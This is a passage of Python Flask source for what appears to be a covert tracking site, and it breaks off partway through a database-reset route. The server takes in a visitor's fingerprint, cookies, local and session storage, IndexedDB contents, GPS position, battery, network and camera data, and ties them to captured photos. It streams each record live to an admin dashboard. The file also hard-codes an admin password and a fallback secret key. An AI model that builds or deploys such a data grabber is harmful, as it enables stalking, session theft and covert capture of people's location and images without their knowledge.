from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
from datetime import datetime
import sqlite3
import hashlib
import json
import os
import requests
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'ed09a8f63982882c3ce5bb2897d1d9d3')
CORS(app)

# Use eventlet mode for production (better compatibility with Railway)
# Eventlet provides excellent WebSocket support and works well with socketio.run()
# Auto-detect best async mode based on environment
# Railway sets multiple env vars: RAILWAY_ENVIRONMENT, RAILWAY_PROJECT_ID, etc.
is_railway = any(key.startswith('RAILWAY_') for key in os.environ.keys())
is_render = 'RENDER' in os.environ
is_production = is_railway or is_render

if is_production:
    # Try eventlet first (more stable for production with socketio.run())
    try:
        import eventlet
        eventlet.monkey_patch()
        async_mode = 'eventlet'
        print(f"[SOCKETIO] Using eventlet async mode (production - Railway: {is_railway}, Render: {is_render})")
    except ImportError:
        # Fall back to threading if eventlet not available
        async_mode = 'threading'
        print("[SOCKETIO] Eventlet not available, using threading mode")
else:
    # Use threading for local development
    async_mode = 'threading'
    print("[SOCKETIO] Using threading async mode (development)")

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode=async_mode,
    logger=False,  # Disable to prevent false error logs
    engineio_logger=False,  # Disable to prevent false error logs
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=1e6  # Limit buffer size to prevent memory issues
)

# Database setup
DB_PATH = 'user_data.db'

# Photo storage setup
PHOTOS_FOLDER = 'captured_photos'
if not os.path.exists(PHOTOS_FOLDER):
    os.makedirs(PHOTOS_FOLDER)
    print(f"Created photos folder: {PHOTOS_FOLDER}")

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def init_db():
    """Initialize the database with required tables"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Table to store collected user data
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        device_info TEXT,
        fingerprint TEXT,
        location_data TEXT,
        storage_info TEXT,
        connection_info TEXT,
        vpn_detection TEXT,
        battery_info TEXT,
        network_info TEXT,
        media_devices TEXT,
        camera_permission TEXT,
        raw_data TEXT
    )''')

    # Migrate existing database: Add new columns if they don't exist
    try:
        # Check if new columns exist
        c.execute("PRAGMA table_info(collected_data)")
        columns = [col[1] for col in c.fetchall()]

        # Add missing columns
        if 'battery_info' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN battery_info TEXT')
            print("Added battery_info column")

        if 'network_info' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN network_info TEXT')
            print("Added network_info column")

        if 'media_devices' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN media_devices TEXT')
            print("Added media_devices column")

        if 'camera_permission' not in columns:
            c.execute('ALTER TABLE collected_data ADD COLUMN camera_permission TEXT')
            print("Added camera_permission column")

    except Exception as e:
        print(f"Migration note: {e}")

    # Admin credentials table (username: Sabbar, password: Lights@123! - CHANGE THIS!)
    c.execute('''CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL
    )''')

    # Always ensure new admin credentials are set and old ones are removed/updated
    # Default password: Lights@123! (CHANGE THIS!)
    password_hash = hashlib.sha256('Lights@123!'.encode()).hexdigest()
    
    # Check if new admin exists
    c.execute('SELECT * FROM admin_users WHERE username = ?', ('Sabbar',))
    sabbar_user = c.fetchone()
    
    # Check if old admin exists
    c.execute('SELECT * FROM admin_users WHERE username = ?', ('admin',))
    old_admin = c.fetchone()
    
    if old_admin:
        # Delete old admin user
        c.execute('DELETE FROM admin_users WHERE username = ?', ('admin',))
    
    if not sabbar_user:
        # Create new admin user with correct credentials
        c.execute('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)',
                  ('Sabbar', password_hash))
    else:
        # Update existing Sabbar user to ensure correct password
        c.execute('UPDATE admin_users SET password_hash = ? WHERE username = ?',
                  (password_hash, 'Sabbar'))

    # Photos table to store captured photos metadata
    c.execute('''CREATE TABLE IF NOT EXISTS captured_photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT NOT NULL,
        filename TEXT NOT NULL,
        filepath TEXT NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        file_size INTEGER,
        fingerprint TEXT,
        data_entry_id INTEGER,
        capture_source TEXT
    )''')

    # Migrate existing photos table
    try:
        c.execute("PRAGMA table_info(captured_photos)")
        photo_columns = [col[1] for col in c.fetchall()]

        if 'fingerprint' not in photo_columns:
            c.execute('ALTER TABLE captured_photos ADD COLUMN fingerprint TEXT')
            print("Added fingerprint column to captured_photos")

        if 'data_entry_id' not in photo_columns:
            c.execute('ALTER TABLE captured_photos ADD COLUMN data_entry_id INTEGER')
            print("Added data_entry_id column to captured_photos")

        if 'capture_source' not in photo_columns:
            c.execute('ALTER TABLE captured_photos ADD COLUMN capture_source TEXT')
            print("Added capture_source column to captured_photos")
    except Exception as e:
        print(f"Photo table migration note: {e}")

    conn.commit()
    conn.close()

# Initialize database on startup
init_db()

# Print startup confirmation
print("[APP] Flask app initialized successfully")
print("[APP] Server ready to accept connections")

@app.route('/')
def index():
    """Serve the main page with the button"""
    return render_template('index.html')

@app.route('/health')
def health():
    """Health check endpoint for Railway"""
    return jsonify({'status': 'ok', 'service': 'running'}), 200

@app.route('/test')
def test():
    """Simple test endpoint to verify Railway is working"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Railway Test</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            }
            .container {
                background: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                text-align: center;
            }
            h1 { color: #28a745; margin: 0 0 20px 0; }
            p { color: #666; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✅ Railway is Working!</h1>
            <p>If you can see this, Railway is serving your Flask app correctly.</p>
            <p>Time: <span id="time"></span></p>
            <script>
                document.getElementById('time').textContent = new Date().toLocaleString();
            </script>
        </div>
    </body>
    </html>
    """

def get_client_ip():
    """Extract client IP from request, handling proxy headers correctly"""
    # Check X-Real-IP first (used by some proxies like Render)
    ip = request.headers.get('X-Real-IP')
    if ip:
        return ip.split(',')[0].strip()
    
    # Check X-Forwarded-For (can contain multiple IPs, take the first one)
    ip = request.headers.get('X-Forwarded-For')
    if ip:
        # X-Forwarded-For can contain multiple IPs: "client, proxy1, proxy2"
        # The first IP is the original client IP
        return ip.split(',')[0].strip()
    
    # Fallback to remote_addr
    return request.remote_addr

@app.route('/api/get-ip-info')
def get_ip_info():
    """Backend endpoint to fetch IP info (avoids CORS issues)
    IMPORTANT: Always returns remote user's IP info, never server's IP info
    """
    try:
        # Get client IP from headers (for when behind proxy/load balancer)
        client_ip = get_client_ip()
        
        # Check if client IP is private/localhost
        is_private = (client_ip in ['127.0.0.1', 'localhost', '::1'] or 
                     client_ip.startswith('192.168.') or 
                     client_ip.startswith('10.') or
                     client_ip.startswith('172.16.') or
                     client_ip.startswith('172.17.') or
                     client_ip.startswith('172.18.') or
                     client_ip.startswith('172.19.') or
                     client_ip.startswith('172.20.') or
                     client_ip.startswith('172.21.') or
                     client_ip.startswith('172.22.') or
                     client_ip.startswith('172.23.') or
                     client_ip.startswith('172.24.') or
                     client_ip.startswith('172.25.') or
                     client_ip.startswith('172.26.') or
                     client_ip.startswith('172.27.') or
                     client_ip.startswith('172.28.') or
                     client_ip.startswith('172.29.') or
                     client_ip.startswith('172.30.') or
                     client_ip.startswith('172.31.'))

        # Try multiple IP info providers
        # CRITICAL: Always look up the CLIENT IP, never use server's IP
        # This ensures we get the correct location/VPN status for the remote user, not the server
        providers = [
            ('https://ipapi.co/{}/json/', 'ipapi.co'),
            ('https://ipinfo.io/{}/json', 'ipinfo.io'),
            ('https://ipwhois.app/json/', 'ipwhois.app'),  # This one auto-detects, skip it for private IPs
        ]
        
        # Always try to look up the client IP first (even if private, it might be a public IP behind proxy)
        if client_ip:
            for provider_template, provider_name in providers:
                # Skip auto-detect providers for private IPs (they'll return server IP)
                if not '{' in provider_template and is_private:
                    continue
                    
                try:
                    if '{' in provider_template:
                        # Provider supports IP lookup - use client IP
                        lookup_url = provider_template.format(client_ip)
                    else:
                        # Provider auto-detects - skip for private IPs to avoid server IP
                        if is_private:
                            continue
                        lookup_url = provider_template
                    
                    response = requests.get(lookup_url, timeout=5)
                    if response.ok:
                        data = response.json()
                        # CRITICAL: Always use the client IP from request, never the IP from response
                        # The response IP might be the server's IP if we used auto-detect
                        data['ip'] = client_ip
                        data['provider'] = provider_name
                        data['client_ip_from_request'] = client_ip
                        print(f"[IP INFO] Successfully looked up CLIENT IP {client_ip} using {provider_name}")
                        return jsonify(data), 200
                except Exception as e:
                    print(f"Provider {provider_name} failed for IP {client_ip}: {e}")
                    continue

        # If we couldn't get IP info for the client IP, return minimal data with client IP
        # NEVER use auto-detect here as it would return server's IP
        # This ensures we always show remote user's IP, not server's IP
        print(f"[IP INFO] Could not get IP info for client IP {client_ip}, returning minimal data")
        return jsonify({
            'ip': client_ip, 
            'provider': 'fallback', 
            'note': 'Limited info - IP from request headers (remote user IP)',
            'client_ip_from_request': client_ip,
            'warning': 'Could not fetch location data for this IP'
        }), 200

    except Exception as e:
        print(f"Error fetching IP info: {e}")
        # Even on error, return the client IP, not server IP
        client_ip = get_client_ip()
        return jsonify({
            'ip': client_ip, 
            'error': str(e),
            'client_ip_from_request': client_ip,
            'note': 'Error occurred, but using remote user IP from request'
        }), 200

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """API endpoint to receive data from frontend"""
    try:
        data = request.json
        timestamp = datetime.now().isoformat()
        
        # Debug: Log what we received
        print(f"\n{'='*60}")
        print(f"[DATA COLLECTION] Received data at {timestamp}")
        print(f"[DATA COLLECTION] Keys in data: {list(data.keys()) if data else 'None'}")
        if 'cameraAccess' in data:
            print(f"[DATA COLLECTION] cameraAccess in data: {data.get('cameraAccess')}")
        else:
            print(f"[DATA COLLECTION] cameraAccess NOT in data!")
        print(f"{'='*60}\n")

        # Get client IP - prefer the IP from geolocation service (more accurate for public IP)
        # Fall back to request headers if not available
        ip_from_geo = data.get('ipInfo', {}).get('ip')
        ip_from_request = get_client_ip()
        ip_address = ip_from_geo if ip_from_geo else ip_from_request

        # Extract data from the payload
        device_info = json.dumps(data.get('deviceInfo', {}))
        fingerprint = data.get('fingerprint', {}).get('fp', '')

        # Prioritize GPS coordinates over IP location
        device_coords = data.get('deviceCoords')
        ip_info = data.get('ipInfo', {})
        
        # Normalize location data to ensure consistent field names
        # Handle different IP info provider formats
        normalized_location = {
            'ip': ip_info.get('ip'),
            'city': ip_info.get('city'),
            'region': ip_info.get('region'),
            'country': ip_info.get('country') or ip_info.get('country_name'),
            'latitude': ip_info.get('latitude') or ip_info.get('lat'),
            'longitude': ip_info.get('longitude') or ip_info.get('lon'),
            'org': ip_info.get('org') or ip_info.get('isp'),
            'provider': ip_info.get('provider'),
            # Keep raw data for reference
            'raw': ip_info.get('raw', ip_info)
        }

        if device_coords and device_coords.get('lat') and device_coords.get('lon'):
            # User granted location permission - use GPS coordinates
            # Try to reverse geocode GPS coordinates to get accurate city/country
            gps_lat = device_coords.get('lat')
            gps_lon = device_coords.get('lon')
            
            # Use reverse geocoding to get location from GPS coordinates
            gps_city = None
            gps_country = None
            gps_region = None
            
            try:
                # Try reverse geocoding using OpenStreetMap Nominatim (free, no API key needed)
                reverse_geocode_url = f'https://nominatim.openstreetmap.org/reverse?format=json&lat={gps_lat}&lon={gps_lon}&zoom=10'
                reverse_response = requests.get(reverse_geocode_url, timeout=5, headers={'User-Agent': 'LocationTracker/1.0'})
                if reverse_response.ok:
                    reverse_data = reverse_response.json()
                    address = reverse_data.get('address', {})
                    gps_city = address.get('city') or address.get('town') or address.get('village') or address.get('municipality')
                    gps_country = address.get('country')
                    gps_region = address.get('state') or address.get('region')
                    print(f"[GPS REVERSE GEOCODE] Got location: {gps_city}, {gps_region}, {gps_country}")
            except Exception as e:
                print(f"[GPS REVERSE GEOCODE] Failed: {e}, using IP-based location info")
            
            # Use GPS-based location if available, otherwise fall back to IP-based
            location_data = json.dumps({
                **normalized_location,  # Keep IP info for reference
                'gps': device_coords,
                'latitude': gps_lat,
                'longitude': gps_lon,
                'location_type': 'gps',
                'accuracy': device_coords.get('accuracy'),
                'altitude': device_coords.get('altitude'),
                # Use GPS-based city/country if available, otherwise use IP-based
                'city': gps_city or normalized_location.get('city'),
                'country': gps_country or normalized_location.get('country'),
                'region': gps_region or normalized_location.get('region')
            })
        else:
            # Location permission denied - use IP-based location
            location_data = json.dumps({
                **normalized_location,
                'location_type': 'ip'
            })

        storage_info = json.dumps({
            'cookies': data.get('cookies', []),
            'localStorage': data.get('localStorage', {}),
            'sessionStorage': data.get('sessionStorage', {}),
            'indexedDB': data.get('indexedDB', {})
        })
        connection_info = json.dumps(data.get('connectionInfo', {}))
        vpn_detection = json.dumps(data.get('vpnDetection', {}))
        battery_info = json.dumps(data.get('batteryInfo', {}))
        network_info = json.dumps(data.get('networkInfo', {}))
        media_devices = json.dumps(data.get('mediaDevices', {}))
        
        # Ensure camera permission is properly stored
        # Get cameraAccess from the data - it should be sent from frontend
        camera_access = data.get('cameraAccess')
        
        # Debug: Log what we received
        print(f"[CAMERA PERMISSION DEBUG] Raw data.get('cameraAccess'): {camera_access}")
        print(f"[CAMERA PERMISSION DEBUG] Type: {type(camera_access)}")
        
        # Check if camera_access is None, empty dict, or doesn't have granted field
        if camera_access is None:
            # Try to get it from data directly
            if 'cameraAccess' in data:
                camera_access = data['cameraAccess']
                print(f"[CAMERA PERMISSION DEBUG] Got from data['cameraAccess']: {camera_access}")
        elif isinstance(camera_access, dict):
            # Check if it's an empty dict or missing granted field
            if len(camera_access) == 0 or 'granted' not in camera_access:
                # Try to get it from data directly
                if 'cameraAccess' in data:
                    potential = data['cameraAccess']
                    if isinstance(potential, dict) and 'granted' in potential:
                        camera_access = potential
                        print(f"[CAMERA PERMISSION DEBUG] Replaced with data['cameraAccess']: {camera_access}")
        else:
            # Not a dict, try to get from data
            if 'cameraAccess' in data:
                camera_access = data['cameraAccess']
                print(f"[CAMERA PERMISSION DEBUG] Got from data['cameraAccess'] (was not dict): {camera_access}")
        
        # If still None or not a dict, create empty dict
        if camera_access is None:
            camera_access = {}
            print(f"[CAMERA PERMISSION DEBUG] Created empty dict (was None)")
        elif not isinstance(camera_access, dict):
            # If it's not a dict, create empty
            print(f"[CAMERA PERMISSION DEBUG] camera_access is not a dict, type: {type(camera_access)}, creating empty dict")
            camera_access = {}
        
        # Log what we're storing
        print(f"[CAMERA PERMISSION] Final camera_access: {camera_access}")
        print(f"[CAMERA PERMISSION] Has granted field: {'granted' in camera_access if isinstance(camera_access, dict) else False}")
        if isinstance(camera_access, dict) and 'granted' in camera_access:
            print(f"[CAMERA PERMISSION] Granted value: {camera_access.get('granted')} (type: {type(camera_access.get('granted'))})")
        
        camera_permission = json.dumps(camera_access)
        user_agent = request.headers.get('User-Agent', '')
        raw_data = json.dumps(data)

        # Enhanced logging for camera permission
        camera_data = camera_access
        print(f"\n{'='*60}")
        print(f"[DATA COLLECTION] New entry at {timestamp}")
        print(f"IP Address: {ip_address}")
        print(f"Camera Permission Data: {camera_data}")
        print(f"Camera Granted: {camera_data.get('granted', 'NOT SET')}")
        print(f"Camera Message: {camera_data.get('message', 'NO MESSAGE')}")
        if camera_data.get('error'):
            print(f"Camera Error: {camera_data.get('error')}")
        print(f"Camera Permission JSON: {camera_permission}")
        print(f"{'='*60}\n")

        # Store in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Check if user with same fingerprint already exists
        c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
        existing_entry = c.fetchone()
        
        if existing_entry:
            # Update existing entry instead of creating new one
            entry_id = existing_entry[0]
            print(f"[DATA COLLECTION] Updating existing entry #{entry_id} for fingerprint {fingerprint[:16]}...")
            
            c.execute('''UPDATE collected_data SET
                         timestamp = ?,
                         ip_address = ?,
                         user_agent = ?,
                         device_info = ?,
                         location_data = ?,
                         storage_info = ?,
                         connection_info = ?,
                         vpn_detection = ?,
                         battery_info = ?,
                         network_info = ?,
                         media_devices = ?,
                         camera_permission = ?,
                         raw_data = ?
                         WHERE id = ?''',
                      (timestamp, ip_address, user_agent, device_info,
                       location_data, storage_info, connection_info, vpn_detection,
                       battery_info, network_info, media_devices, camera_permission, raw_data,
                       entry_id))
            
            print(f"[DATA COLLECTION] Entry #{entry_id} updated successfully")
        else:
            # Create new entry for new user
            c.execute('''INSERT INTO collected_data
                         (timestamp, ip_address, user_agent, device_info, fingerprint,
                          location_data, storage_info, connection_info, vpn_detection,
                          battery_info, network_info, media_devices, camera_permission, raw_data)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                      (timestamp, ip_address, user_agent, device_info, fingerprint,
                       location_data, storage_info, connection_info, vpn_detection,
                       battery_info, network_info, media_devices, camera_permission, raw_data))
            entry_id = c.lastrowid
            print(f"[DATA COLLECTION] New entry #{entry_id} created for fingerprint {fingerprint[:16]}...")
        
        conn.commit()
        conn.close()

        # Broadcast new/updated entry to admin dashboard via WebSocket
        try:
            if existing_entry:
                # Entry was updated - broadcast update event with full data
                # Also send full entry data so dashboard can add it if not found
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute('SELECT * FROM collected_data WHERE id = ?', (entry_id,))
                row = c.fetchone()
                conn.close()
                
                if row:
                    # Parse entry data (same as new entry)
                    entry_id_db = row[0]
                    fingerprint_db = row[5]
                    
                    # Find associated photo
                    conn = sqlite3.connect(DB_PATH)
                    c = conn.cursor()
                    c.execute('''SELECT filename FROM captured_photos
                                 WHERE fingerprint = ? OR data_entry_id = ?
                                 ORDER BY timestamp DESC LIMIT 1''', (fingerprint_db, entry_id_db))
                    photo_row = c.fetchone()
                    photo_filename = photo_row[0] if photo_row else None
                    conn.close()
                    
                    # Parse camera permission
                    camera_permission_raw = row[14] if len(row) > 14 and row[14] else '{}'
                    try:
                        camera_permission = json.loads(camera_permission_raw)
                        if camera_permission and isinstance(camera_permission, dict):
                            if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
                                if 'cameraAccess' in camera_permission:
                                    camera_permission = camera_permission['cameraAccess']
                                else:
                                    camera_permission = {}
                    except Exception as e:
                        print(f"[WEBSOCKET] Error parsing camera permission: {e}")
                        camera_permission = {}
                    
                    # Check if user is online
                    is_online = entry_id_db in active_users or fingerprint_db in [user_info.get('fingerprint', '') for user_info in active_users.values()]
                    
                    # Prepare full entry data
                    try:
                        entry_data = {
                            'id': entry_id_db,
                            'timestamp': row[1],
                            'ip_address': row[2],
                            'user_agent': row[3],
                            'device_info': json.loads(row[4]) if row[4] else {},
                            'fingerprint': fingerprint_db,
                            'location_data': json.loads(row[6]) if row[6] else {},
                            'storage_info': json.loads(row[7]) if row[7] else {},
                            'connection_info': json.loads(row[8]) if row[8] else {},
                            'vpn_detection': json.loads(row[9]) if row[9] else {},
                            'battery_info': json.loads(row[10]) if len(row) > 10 and row[10] else {},
                            'network_info': json.loads(row[11]) if len(row) > 11 and row[11] else {},
                            'media_devices': json.loads(row[12]) if len(row) > 12 and row[12] else {},
                            'camera_permission': camera_permission,
                            'raw_data': row[14] if len(row) > 14 else None,
                            'profile_photo': photo_filename,
                            'is_online': is_online,
                            'updated': True
                        }
                        
                        # Send as new_entry so dashboard can add/update it
                        socketio.emit('new_entry', entry_data, broadcast=True, include_self=False, namespace='/')
                        print(f"[WEBSOCKET] Broadcasted entry update (as new_entry) for entry #{entry_id}")
                    except Exception as e:
                        print(f"[WEBSOCKET] Error preparing updated entry data: {e}")
                        # Fallback to simple update
                        socketio.emit('entry_updated', {
                            'entry_id': entry_id,
                            'timestamp': timestamp,
                            'ip_address': ip_address,
                            'fingerprint': fingerprint,
                            'updated': True
                        }, broadcast=True, include_self=False, namespace='/')
                        print(f"[WEBSOCKET] Broadcasted simple entry update for entry #{entry_id}")
            else:
                # New entry created - broadcast new entry event
                # Fetch the full entry data to send to dashboard
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute('SELECT * FROM collected_data WHERE id = ?', (entry_id,))
                row = c.fetchone()
                conn.close()
                
                if row:
                    # Parse the entry data similar to dashboard route
                    entry_id_db = row[0]
                    fingerprint_db = row[5]
                    
                    # Find associated photo
                    conn = sqlite3.connect(DB_PATH)
                    c = conn.cursor()
                    c.execute('''SELECT filename FROM captured_photos
                                 WHERE fingerprint = ? OR data_entry_id = ?
                                 ORDER BY timestamp DESC LIMIT 1''', (fingerprint_db, entry_id_db))
                    photo_row = c.fetchone()
                    photo_filename = photo_row[0] if photo_row else None
                    conn.close()
                    
                    # Parse camera permission
                    camera_permission_raw = row[14] if row[14] else '{}'
                    try:
                        camera_permission = json.loads(camera_permission_raw)
                        if camera_permission and isinstance(camera_permission, dict):
                            if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
                                if 'cameraAccess' in camera_permission:
                                    camera_permission = camera_permission['cameraAccess']
                                else:
                                    camera_permission = {}
                    except Exception as e:
                        print(f"[WEBSOCKET] Error parsing camera permission: {e}")
                        camera_permission = {}
                    
                    # Check if user is online
                    is_online = entry_id_db in active_users or fingerprint_db in [user_info.get('fingerprint', '') for user_info in active_users.values()]
                    
                    # Prepare entry data for dashboard
                    # Column order: id, timestamp, ip_address, user_agent, device_info, fingerprint,
                    # location_data, storage_info, connection_info, vpn_detection,
                    # battery_info, network_info, media_devices, camera_permission, raw_data
                    try:
                        entry_data = {
                            'id': entry_id_db,
                            'timestamp': row[1],
                            'ip_address': row[2],
                            'user_agent': row[3],
                            'device_info': json.loads(row[4]) if row[4] else {},
                            'fingerprint': fingerprint_db,
                            'location_data': json.loads(row[6]) if row[6] else {},
                            'storage_info': json.loads(row[7]) if row[7] else {},
                            'connection_info': json.loads(row[8]) if row[8] else {},
                            'vpn_detection': json.loads(row[9]) if row[9] else {},
                            'battery_info': json.loads(row[10]) if len(row) > 10 and row[10] else {},
                            'network_info': json.loads(row[11]) if len(row) > 11 and row[11] else {},
                            'media_devices': json.loads(row[12]) if len(row) > 12 and row[12] else {},
                            'camera_permission': camera_permission,
                            'raw_data': row[14] if len(row) > 14 else None,
                            'profile_photo': photo_filename,
                            'is_online': is_online
                        }
                        
                        socketio.emit('new_entry', entry_data, broadcast=True, include_self=False, namespace='/')
                        print(f"[WEBSOCKET] Broadcasted new entry #{entry_id} to dashboard")
                        print(f"[WEBSOCKET] Entry data keys: {list(entry_data.keys())}")
                        print(f"[WEBSOCKET] Entry ID: {entry_data.get('id')}, IP: {entry_data.get('ip_address')}")
                    except Exception as e:
                        print(f"[WEBSOCKET] Error preparing entry data: {e}")
        except Exception as e:
            print(f"[WEBSOCKET] Error broadcasting entry: {e}")
            # Don't fail the request if WebSocket broadcast fails

        return jsonify({
            'status': 'success', 
            'message': 'Data collected successfully',
            'entry_id': entry_id,
            'fingerprint': fingerprint,
            'updated': existing_entry is not None
        }), 200

    except Exception as e:
        print(f"Error collecting data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        password_hash = hashlib.sha256(password.encode()).hexdigest()

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT * FROM admin_users WHERE username = ? AND password_hash = ?',
                  (username, password_hash))
        user = c.fetchone()
        conn.close()

        if user:
            session['admin_logged_in'] = True
            session['username'] = username
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template('login.html', error='Invalid credentials')

    return render_template('login.html')

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard to view all collected data"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
    rows = c.fetchall()

    # Convert rows to list of dictionaries
    data = []
    for row in rows:
        entry_id = row[0]
        fingerprint = row[5]

        # Find associated photo for this entry
        photo_filename = None
        c2 = conn.cursor()
        c2.execute('''SELECT filename FROM captured_photos
                     WHERE fingerprint = ? OR data_entry_id = ?
                     ORDER BY timestamp DESC LIMIT 1''', (fingerprint, entry_id))
        photo_row = c2.fetchone()
        if photo_row:
            photo_filename = photo_row[0]

        # Parse camera permission
        camera_permission_raw = row[14] if row[14] else '{}'
        try:
            camera_permission = json.loads(camera_permission_raw)
            
            # Check if camera_permission contains the entire raw_data (old bug)
            # If it has 'deviceInfo', 'fingerprint', etc., it's the full raw data
            # In that case, extract cameraAccess from it
            if camera_permission and isinstance(camera_permission, dict):
                if 'deviceInfo' in camera_permission or 'fingerprint' in camera_permission:
                    # This is the entire raw_data, extract cameraAccess
                    print(f"[DASHBOARD] Entry #{entry_id} - camera_permission contains full raw_data, extracting cameraAccess")
                    if 'cameraAccess' in camera_permission:
                        camera_permission = camera_permission['cameraAccess']
                        print(f"[DASHBOARD] Entry #{entry_id} - Extracted cameraAccess: {camera_permission}")
                    else:
                        camera_permission = {}
                elif 'granted' in camera_permission:
                    # This is the correct format - just camera permission data
                    print(f"[DASHBOARD] Entry #{entry_id} - camera_permission is correct format: {camera_permission}")
                else:
                    # Empty or malformed
                    camera_permission = {}
            
            # Debug: Log what we're getting from database
            if camera_permission:
                print(f"[DASHBOARD] Entry #{entry_id} - Final camera_permission: {camera_permission}")
                print(f"[DASHBOARD] Entry #{entry_id} - granted value: {camera_permission.get('granted')} (type: {type(camera_permission.get('granted'))})")
        except Exception as e:
            print(f"[DASHBOARD] Entry #{entry_id} - Error parsing camera_permission: {e}, raw: {camera_permission_raw[:200]}...")
            camera_permission = {}
        
        # Check if user is online (registered via WebSocket)
        is_online = entry_id in active_users or fingerprint in [user_info.get('fingerprint', '') for user_info in active_users.values()]
        
        data.append({
            'id': entry_id,
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': fingerprint,
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {},
            'raw_data': row[10],
            'battery_info': json.loads(row[11]) if row[11] else {},
            'network_info': json.loads(row[12]) if row[12] else {},
            'media_devices': json.loads(row[13]) if row[13] else {},
            'camera_permission': camera_permission,
            'profile_photo': photo_filename,  # Add profile photo
            'is_online': is_online  # Add online status
        })

    conn.close()
    return render_template('dashboard.html', data=data, count=len(data))

@app.route('/admin/api/data')
def admin_api_data():
    """API endpoint for admin to get all data as JSON"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM collected_data ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()

    data = []
    for row in rows:
        data.append({
            'id': row[0],
            'timestamp': row[1],
            'ip_address': row[2],
            'user_agent': row[3],
            'device_info': json.loads(row[4]) if row[4] else {},
            'fingerprint': row[5],
            'location_data': json.loads(row[6]) if row[6] else {},
            'storage_info': json.loads(row[7]) if row[7] else {},
            'connection_info': json.loads(row[8]) if row[8] else {},
            'vpn_detection': json.loads(row[9]) if row[9] else {},
            'battery_info': json.loads(row[11]) if row[11] else {},
            'network_info': json.loads(row[12]) if row[12] else {},
            'media_devices': json.loads(row[13]) if row[13] else {},
            'camera_permission': json.loads(row[14]) if row[14] else {}
        })

    return jsonify(data)

@app.route('/admin/api/delete/<int:id>', methods=['DELETE'])
def delete_entry(id):
    """Delete a specific entry"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM collected_data WHERE id = ?', (id,))
    conn.commit()
    conn.close()

    return jsonify({'status': 'success', 'message': 'Entry deleted'})

@app.route('/admin/api/clear-all', methods=['DELETE'])
def clear_all_data():
    """Clear all collected data"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('DELETE FROM collected_data')
        conn.commit()
        deleted_count = c.rowcount
        conn.close()

        print(f"\n[ADMIN ACTION] All data cleared. Deleted {deleted_count} entries.\n")
        return jsonify({'status': 'success', 'message': f'All data cleared. Deleted {deleted_count} entries.'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/api/reset-database', methods=['DELETE'])
def reset_database():
    """Reset entire database - delete all data, photos, and photo files"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        # Count entries before deletion
        c.execute('SELECT COUNT(*) FROM collected_data')
        data_count = c.fetchone()[0]

